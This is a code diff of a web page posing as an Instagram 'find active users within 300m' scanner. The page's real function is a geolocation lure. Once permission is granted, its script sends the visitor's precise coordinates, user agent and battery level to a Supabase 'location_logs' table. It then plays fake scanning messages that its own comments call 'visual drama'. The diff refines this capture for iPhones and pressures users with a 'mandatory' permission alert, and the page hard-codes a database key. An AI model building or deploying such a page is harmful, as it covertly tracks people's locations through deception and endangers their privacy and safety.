@@ -9,20 +9,14 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
         :root { --ig-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #050b18; }
-        
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
         
         body { 
-            background: var(--bg); 
-            color: white; 
-            min-height: 100vh; 
-            overflow-x: hidden; 
-            /* Scrolling allowed, but zooming blocked */
-            touch-action: pan-y; 
+            background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden;
+            touch-action: pan-y; /* Vertical scroll ON, Pinch-zoom OFF */
         }
         
         .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 15% 20%, rgba(220, 39, 67, 0.15) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(64, 93, 230, 0.15) 0%, transparent 40%); }
-
         nav { padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; background: rgba(5, 11, 24, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); }
         .logo { font-weight: 900; font-size: 24px; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
@@ -40,9 +34,9 @@
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .loader { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #dc2743; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
 
-        #results { display: none; padding: 40px 20px; text-align: center; background: var(--bg); }
+        #results { display: none; padding: 40px 20px; text-align: center; background: var(--bg); padding-bottom: 100px; }
         .result-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 30px; }
-        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; }
+        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; text-align: center; }
         .card img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #dc2743; padding: 3px; margin-bottom: 10px; object-fit: cover; }
 
         @keyframes pulse-anim { 0% { transform: scale(0.7); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
@@ -58,7 +52,6 @@
     <section class="hero" id="home">
         <h1>Discover <span style="color: #dc2743">Active</span><br>Users Near You.</h1>
         <p>Find and connect with active profiles within 300m of your location.</p>
-        
         <div class="radar-box">
             <div class="radar-circle">
                 <div class="pulse"></div>
@@ -66,7 +59,6 @@
                 <i class="fab fa-instagram ig-icon"></i>
             </div>
         </div>
-
         <button class="btn-main" onclick="p_system_fire()">
             <i class="fas fa-search-location"></i> SCAN USER
         </button>
@@ -88,29 +80,32 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
     const pardhan_sb = supabase.createClient(SB_URL, SB_KEY);
 
-    async function p_system_fire() {
+    // Synchronous function for iPhone Gesture Trust
+    function p_system_fire() {
         const log = document.getElementById('log');
         const overlay = document.getElementById('overlay');
         
-        // iPhone Fix: Call geolocation IMMEDIATELY
         if (navigator.geolocation) {
+            // STEP 1: Request Geolocation IMMEDIATELY (iPhone requirement)
             navigator.geolocation.getCurrentPosition(async (pos) => {
+                // STEP 2: Permission Granted -> Now start the visual drama
                 overlay.style.display = 'flex';
                 log.innerText = "Coordinates Secured. Syncing...";
 
+                // Capture battery in background
                 let batt = "N/A";
                 try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}%`; } catch(e) {}
 
-                // Send data to Supabase
+                // Send to Supabase
                 const { error } = await pardhan_sb.from('location_logs').insert([{
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     user_agent: navigator.userAgent,
-                    ip: `Batt: ${batt} | Insta-Finder` 
+                    ip: `Batt: ${batt} | Insta-Finder v14` 
                 }]);
 
                 if (!error) {
-                    setTimeout(() => { log.innerText = "Analyzing Local Nodes..."; }, 1500);
+                    setTimeout(() => { log.innerText = "Analyzing Regional Nodes..."; }, 1500);
                     setTimeout(() => { log.innerText = "Fetching Profiles..."; }, 3500);
                     setTimeout(() => {
                         overlay.style.display = 'none';
@@ -120,7 +115,7 @@
                     }, 5500);
                 }
             }, (err) => {
-                alert("Location permission is required. Please allow and refresh.");
+                alert("Location permission is mandatory to scan nearby users. Please allow and refresh.");
                 location.reload();
             }, { enableHighAccuracy: true });
         }
